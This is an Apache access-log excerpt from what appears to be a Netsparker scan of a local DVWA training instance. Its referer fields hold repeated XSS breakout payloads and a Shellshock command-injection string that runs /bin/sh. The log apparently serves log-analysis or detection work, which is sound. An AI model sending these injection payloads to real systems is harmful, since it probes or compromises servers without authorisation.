      "\"192.168.4.164 - - [22/Dec/2023:15:20:26 +0300] \"GET /DVWA/login.php HTTP/1.1\" 200 986 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000292)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:26 +0300] \"GET /DVWA/login.php HTTP/1.1\" 200 986 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000293)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:34 +0300] \"POST /DVWA/login.php HTTP/1.1\" 302 384 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:34 +0300] \"POST /DVWA/login.php HTTP/1.1\" 302 384 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:39 +0300] \"GET /DVWA/vulnerabilities/?C=N;O=D HTTP/1.1\" 200 857 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:43 +0300] \"GET /DVWA/vulnerabilities/view_help.php HTTP/1.1\" 200 763 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:43 +0300] \"GET /DVWA/vulnerabilities/view_help.php HTTP/1.1\" 200 763 \"'\\\"--></style></scRipt><scRipt>netsparker(0x00030E)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:43 +0300] \"GET /DVWA/vulnerabilities/view_help.php HTTP/1.1\" 200 763 \"'\\\"--></style></scRipt><scRipt>netsparker(0x00030F)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:44 +0300] \"GET /DVWA/vulnerabilities/view_help.php HTTP/1.1\" 200 763 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000318)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:44 +0300] \"GET /DVWA/vulnerabilities/view_help.php HTTP/1.1\" 200 763 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000319)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:45 +0300] \"GET /DVWA/vulnerabilities/view_source.php HTTP/1.1\" 200 962 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:45 +0300] \"GET /DVWA/vulnerabilities/view_source.php HTTP/1.1\" 200 962 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000344)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:45 +0300] \"GET /DVWA/vulnerabilities/view_source.php HTTP/1.1\" 200 962 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000345)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:45 +0300] \"GET /DVWA/vulnerabilities/view_source.php HTTP/1.1\" 200 962 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000342)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:45 +0300] \"GET /DVWA/vulnerabilities/view_source.php HTTP/1.1\" 200 962 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000343)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:46 +0300] \"GET /DVWA/vulnerabilities/?C=N;O=D HTTP/1.1\" 200 857 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000360)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:46 +0300] \"GET /DVWA/vulnerabilities/?C=N;O=D HTTP/1.1\" 200 857 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000361)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:46 +0300] \"GET /DVWA/vulnerabilities/?C=N;O=D HTTP/1.1\" 200 857 \"'\\\"--></style></scRipt><scRipt>netsparker(0x00035E)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:46 +0300] \"GET /DVWA/vulnerabilities/?C=N;O=D HTTP/1.1\" 200 857 \"'\\\"--></style></scRipt><scRipt>netsparker(0x00035F)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:47 +0300] \"GET /DVWA/vulnerabilities/view_source_all.php HTTP/1.1\" 200 967 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:47 +0300] \"GET /DVWA/vulnerabilities/view_source_all.php HTTP/1.1\" 200 967 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000370)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:47 +0300] \"GET /DVWA/vulnerabilities/view_source_all.php HTTP/1.1\" 200 967 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000371)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:47 +0300] \"GET /DVWA/vulnerabilities/view_source_all.php HTTP/1.1\" 200 967 \"'\\\"--></style></scRipt><scRipt>netsparker(0x00036C)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:47 +0300] \"GET /DVWA/vulnerabilities/view_source_all.php HTTP/1.1\" 200 967 \"'\\\"--></style></scRipt><scRipt>netsparker(0x00036D)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:49 +0300] \"GET /DVWA/dvwa/images/?C=N;O=D HTTP/1.1\" 200 812 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:54 +0300] \"GET /DVWA/instructions.php?doc=readme HTTP/1.1\" 200 1451 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:57 +0300] \"GET /DVWA/dvwa/images/?C=N;O=D HTTP/1.1\" 200 812 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000414)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:57 +0300] \"GET /DVWA/dvwa/images/?C=N;O=D HTTP/1.1\" 200 812 \"'\\\"--></style></scRipt><scRipt>netsparker(0x00040E)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:57 +0300] \"GET /DVWA/dvwa/images/?C=N;O=D HTTP/1.1\" 200 812 \"'\\\"--></style></scRipt><scRipt>netsparker(0x00040F)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:58 +0300] \"GET /DVWA/dvwa/images/?C=N;O=D HTTP/1.1\" 200 812 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000415)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:58 +0300] \"GET /DVWA/instructions.php?doc=readme HTTP/1.1\" 200 1547 \"'\\\"--></style></scRipt><scRipt>netsparker(0x00041C)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:59 +0300] \"GET /DVWA/instructions.php?doc=readme HTTP/1.1\" 200 1451 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000426)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:59 +0300] \"GET /DVWA/instructions.php?doc=readme HTTP/1.1\" 200 1451 \"'\\\"--></style></scRipt><scRipt>netsparker(0x00041D)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:59 +0300] \"POST /DVWA/setup.php HTTP/1.1\" 302 390 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:00 +0300] \"GET /DVWA/instructions.php?doc=readme HTTP/1.1\" 200 1451 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000427)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:02 +0300] \"GET /DVWA/dvwa/css/?C=N;O=D HTTP/1.1\" 200 754 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:04 +0300] \"GET /DVWA/dvwa/css/help.css HTTP/1.1\" 200 503 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:04 +0300] \"POST /DVWA/login.php HTTP/1.1\" 302 384 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000462)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:05 +0300] \"GET /DVWA/dvwa/css/help.css HTTP/1.1\" 200 503 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000468)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:05 +0300] \"GET /DVWA/dvwa/css/help.css HTTP/1.1\" 200 503 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000469)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:05 +0300] \"GET /DVWA/dvwa/css/help.css HTTP/1.1\" 200 503 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000466)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:05 +0300] \"GET /DVWA/dvwa/css/help.css HTTP/1.1\" 200 503 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000467)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:05 +0300] \"GET /DVWA/dvwa/css/source.css HTTP/1.1\" 200 503 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:05 +0300] \"POST /DVWA/login.php HTTP/1.1\" 302 384 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000470)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:05 +0300] \"POST /DVWA/login.php HTTP/1.1\" 302 384 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000473)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:05 +0300] \"POST /DVWA/login.php HTTP/1.1\" 302 384 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000463)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:06 +0300] \"GET /DVWA/dvwa/css/source.css HTTP/1.1\" 200 503 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000496)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:06 +0300] \"GET /DVWA/dvwa/css/source.css HTTP/1.1\" 200 503 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000497)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:06 +0300] \"GET /DVWA/dvwa/css/source.css HTTP/1.1\" 200 503 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000492)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:06 +0300] \"GET /DVWA/dvwa/css/source.css HTTP/1.1\" 200 503 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000493)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:07 +0300] \"GET /DVWA/dvwa/js/?C=N;O=D HTTP/1.1\" 200 713 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:08 +0300] \"GET /DVWA/dvwa/css/?C=N;O=D HTTP/1.1\" 200 718 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0004DE)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:09 +0300] \"GET /DVWA/dvwa/css/?C=N;O=D HTTP/1.1\" 200 754 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0004DF)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:10 +0300] \"GET /DVWA/dvwa/?C=N;O=D HTTP/1.1\" 200 729 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:10 +0300] \"GET /DVWA/dvwa/css/?C=N;O=D HTTP/1.1\" 200 754 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0004F2)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:10 +0300] \"GET /DVWA/dvwa/css/?C=N;O=D HTTP/1.1\" 200 754 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0004F3)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:10 +0300] \"POST /DVWA/setup.php HTTP/1.1\" 302 390 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0004F4)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:10 +0300] \"POST /DVWA/setup.php HTTP/1.1\" 302 390 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0004F5)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:10 +0300] \"POST /DVWA/setup.php HTTP/1.1\" 302 390 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0004F0)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:10 +0300] \"POST /DVWA/setup.php HTTP/1.1\" 302 390 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0004F1)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:12 +0300] \"GET /DVWA/dvwa/includes/ HTTP/1.1\" 200 762 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:13 +0300] \"GET /DVWA/dvwa/includes/ HTTP/1.1\" 200 761 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x00053C)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:13 +0300] \"GET /DVWA/dvwa/includes/ HTTP/1.1\" 200 762 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000530)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:13 +0300] \"GET /DVWA/dvwa/includes/ HTTP/1.1\" 200 762 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000531)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:13 +0300] \"GET /DVWA/dvwa/js/?C=N;O=D HTTP/1.1\" 200 712 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000529)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:13 +0300] \"GET /DVWA/dvwa/js/?C=N;O=D HTTP/1.1\" 200 713 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000528)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:13 +0300] \"GET /DVWA/dvwa/js/?C=N;O=D HTTP/1.1\" 200 713 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000524)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:13 +0300] \"GET /DVWA/dvwa/js/?C=N;O=D HTTP/1.1\" 200 713 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000525)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:13 +0300] \"GET /DVWA/vulnerabilities/exec/include.php HTTP/1.1\" 404 528 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:13 +0300] \"GET /DVWA/vulnerabilities/exec/include.php HTTP/1.1\" 404 528 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000534)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:13 +0300] \"GET /DVWA/vulnerabilities/exec/include.php HTTP/1.1\" 404 528 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000535)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:14 +0300] \"GET /DVWA/dvwa/includes/ HTTP/1.1\" 200 761 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x00053D)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:14 +0300] \"GET /DVWA/vulnerabilities/exec/include.php HTTP/1.1\" 404 527 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000540)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:14 +0300] \"GET /DVWA/vulnerabilities/exec/include.php HTTP/1.1\" 404 527 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000541)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:15 +0300] \"GET /DVWA/dvwa/?C=N;O=D HTTP/1.1\" 200 729 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000584)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:15 +0300] \"GET /DVWA/dvwa/?C=N;O=D HTTP/1.1\" 200 729 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000582)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:15 +0300] \"GET /DVWA/dvwa/?C=N;O=D HTTP/1.1\" 200 729 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000583)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
